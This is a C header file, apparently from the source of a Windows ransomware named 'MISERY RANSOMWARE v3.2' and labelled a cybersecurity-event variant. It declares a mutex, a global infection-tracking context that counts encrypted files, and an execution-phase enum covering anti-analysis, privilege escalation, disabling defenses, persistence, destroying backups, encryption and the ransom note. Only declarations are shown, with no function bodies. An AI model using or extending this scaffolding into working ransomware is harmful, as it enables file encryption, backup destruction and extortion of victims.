#ifndef MISERY_CONFIG_H
#define MISERY_CONFIG_H

#include <windows.h>
#include <stdbool.h>
#include <time.h>

/* ============================================================
 * MISERY RANSOMWARE: v3.2 - Professional Orchestration
 * Cybersecurity Event Variant
 * ============================================================ */

/* Configuration Magic */
#define MISERY_VERSION              "3.2"
#define MISERY_BUILD_DATE           __DATE__
#define MISERY_MAX_PATH             32768
#define MISERY_MAX_TARGETS          10000
#define MISERY_MUTEX_NAME           "Global\\Misery_Mutex_v32"

/* Execution Phases */
typedef enum {
    PHASE_INIT = 0,
    PHASE_ANTI_ANALYSIS,
    PHASE_PRIVILEGE_ESCALATION,
    PHASE_DEFENSE_DISABLE,
    PHASE_PERSISTENCE,
    PHASE_BACKUP_DESTROY,
    PHASE_ENCRYPTION,
    PHASE_RANSOM_NOTE,
    PHASE_CLEANUP,
    PHASE_COMPLETE,
    PHASE_ERROR
} MISERY_PHASE;

/* Execution Context: tracks entire infection lifecycle */
typedef struct {
    MISERY_PHASE     currentPhase;
    MISERY_PHASE     lastPhase;
    bool             phaseSuccess[PHASE_ERROR + 1];
    DWORD            lastError;
    HANDLE           hMutex;
    HANDLE           hLogFile;
    SYSTEMTIME       startTime;
    SYSTEMTIME       currentTime;
    
    /* Statistics */
    DWORD            filesEncrypted;
    DWORD            filesFailed;
    ULONGLONG        bytesEncrypted;
    DWORD            executionTimeMs;
} MISERY_GLOBAL_CTX;

extern MISERY_GLOBAL_CTX g_misery_ctx;

/* Logging Levels */
typedef enum {
    MISERY_LOG_INFO,
    MISERY_LOG_WARN,
    MISERY_LOG_ERROR
} MISERY_LOG_LEVEL;

void MiseryLog(MISERY_LOG_LEVEL level, const char *fmt, ...);
bool MiseryPhaseTransition(MISERY_PHASE newPhase, bool success);
void MiseryReportStats(void);
bool MiseryInitContext(void);
void MiseryCleanupContext(void);

#endif // MISERY_CONFIG_H
